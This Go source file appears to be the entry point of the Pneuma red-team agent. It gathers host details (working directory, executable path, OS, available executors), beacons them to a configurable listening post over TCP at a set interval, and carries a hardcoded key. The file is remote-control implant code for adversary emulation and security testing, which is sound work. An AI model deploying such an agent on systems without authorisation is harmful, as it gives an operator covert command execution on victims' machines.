package main

import (
	"github.com/preludeorg/pneuma/sockets"
	"github.com/preludeorg/pneuma/util"
	"flag"
	"log"
	"math/rand"
	"os"
	"runtime"
	"time"
)

var (
    key = "JWHQZM9Z4HQOYICDHW4OCJAXPPNHBA"
)

func pickName(chars int) string {
	rand.Seed(time.Now().UnixNano())
	const letterBytes = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
	b := make([]byte, chars)
	for i := range b {
		b[i] = letterBytes[rand.Intn(len(letterBytes))]
	}
	return string(b)
}

func buildBeacon(name string, group string) sockets.Beacon {
	pwd, _ := os.Getwd()
	executable, _ := os.Executable()
	return sockets.Beacon{
		Name: name,
		Range: group,
		Pwd: pwd,
		Location: executable,
		Platform: runtime.GOOS,
		Executors: util.DetermineExecutors(runtime.GOOS, runtime.GOARCH),
		Links: make([]sockets.Instruction, 0),
	}
}

func main() {
	name := flag.String("name", pickName(12), "Give this agent a name")
	contact := flag.String("contact", "tcp", "Which contact to use")
	address := flag.String("address", "0.0.0.0:2323", "The ip:port of the socket listening post")
	group := flag.String("range", "red", "Which range to associate to")
	sleep := flag.Int("sleep", 60, "Number of seconds to sleep between beacons")
	flag.Parse()

	log.Printf("[%s] agent at PID %d using key %s", *contact, os.Getpid(), key)
	sockets.CommunicationChannels[*contact].Communicate(*address, *sleep, buildBeacon(*name, *group))
}
